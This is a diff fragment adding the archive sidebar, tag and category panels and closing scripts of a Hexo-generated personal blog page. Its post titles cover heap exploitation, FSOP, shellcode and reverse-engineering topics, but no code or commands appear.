+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE?——File Stream Oriented Programming</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
